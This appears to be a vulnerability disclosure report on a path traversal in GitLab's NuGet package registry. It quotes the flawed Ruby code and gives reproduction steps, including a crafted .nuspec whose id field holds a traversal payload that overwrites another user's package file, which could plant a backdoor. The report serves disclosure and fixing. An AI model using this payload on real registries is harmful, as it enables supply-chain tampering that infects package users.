## Report

####  Summary

The vulnerability allows an attacker to overwrite NuGet package of another user. The issue exists in update_package_from_metadata_service.rb which fails to check the filename of the for path traversal.

**update_package_from_metadata_service.rb**  
```  
def execute  
...  
    # Updating file_name updates the path where the file is stored.  
    # We must pass the file again so that CarrierWave can handle the update  
    [@]package_file.update!(  
        file_name: package_filename,  
        file: [@]package_file.file  
    )  
...  
def package_filename  
    &#34;#{package_name.downcase}.#{package_version.downcase}.nupkg&#34;  
end

```  
Here `package_name` are fetched `package_version` from *.nuspec file from `&lt;id&gt;` and `&lt;version&gt;` values. Then they are concatenated and extension is appended to the resulting filename that is passed to `update!` function to update a path to the package.

`package_name` is not properly checked which allows us to overwrite any file with path traversal. The only restriction here is that we are limited to `.nupkg` files, so the attack surface is lower, but it still can be used to do harmful things.

To overwrite NuGet package file from the victim repository we need to know the full path to the files.   
Assuming that packages are stored in `var/opt/gitlab/gitlab-rails/shared/packages/` by default, it&#39;s pretty easy to build a full path. We need to know the following things:  
packages_folder  
victim_project_id  
package_id  
package_file_id


####  Steps to reproduce

1. Create two accounts for attacker and for victim.  
2. As a victim, create a new repository and upload a valid NuGet package to the registry.  
3. As an attacker, gather `project_id`, `package_id`, and `package_file_id`.  
 - `project_id` can be found in the repository main page.   
 - `package_id` can be found in URL after navigating to the package page.   
 - `package_file_id` can be found after clicking on the package file and inspecting the URL. For example, URL will look like this: `http://gitlab.local/root/nuget/-/package_files/87/download`, so 87 is `package_file_id`  
4. As an attacker, prepare a malicious package with a backdoor(it can be any, doesn&#39;t matter here).  
Unzip .nupkg file and edit &lt;package_name&gt;.nuspec file and update `id` value to the following:  
`../../../../../../../../../../../../../../../../../../../../../../../../` + `&lt;default_package_dir&gt;` + `/` + `1,2 characters of sha256(project_id)`+ `/` + `3,4 characters of sha256(project_id)` + `/` + `sha256(project_id)` + `/packages/` + `package_id` + `/files/` + `package_file_id` + `&lt;name of the package without version and extension&gt;`  
Also, you will need to update version to match the version in package you want to rewrite.

For example,   
```  
project_id = 51  
package_id = 74  
package_file_id = 87  
name of the package = asdf.0.20.0.nupkg  
package directory = /var/opt/gitlab/gitlab-rails/shared/packages/  
```

Example of crafted *.nuspec file:  
```  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;  
&lt;package xmlns=&#34;http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd&#34;&gt;  
  &lt;metadata&gt;  
    &lt;id&gt;../../../../../../../../../../../../../../../../../../../../../../../../var/opt/gitlab/gitlab-rails/shared/packages/03/1b/031b4af5197ec30a926f48cf40e11a7dbc470048a21e4003b7a3c07c5dab1baa/packages/74/files/87/asdf&lt;/id&gt;  
    &lt;version&gt;0.20.0&lt;/version&gt;  
     ...  
  &lt;/metadata&gt;  
&lt;/package&gt;  
```  
This will overwrite file on `/var/opt/gitlab/gitlab-rails/shared/packages/03/1b/031b4af5197ec30a926f48cf40e11a7dbc470048a21e4003b7a3c07c5dab1baa/packages/74/files/87/asdf.0.20.0.nupkg`

5. Zip the package back and upload it.

![gitlab_nuget_path_traversal.mp4](https://h1.sec.gitlab.net/a/ed94fcdf-6f46-4c62-99bf-dda1ea916f3a/gitlab_nuget_path_traversal.mp4)

####  What is the current *bug* behavior?

The application allows an attacker to overwrite NuGet packages of other users via path traversal.

####  What is the expected *correct* behavior?

Application checks `package_filename` for path traversal before updating the path to the package.

####  Impact

This vulnerability can be used to overwrite NuGet packages of other users which can be used to backdoor valid packages and infect any user that uses it.

Also, it can be used to store .nupkg files on random places of the system. This potentially can lead to some serious issues.
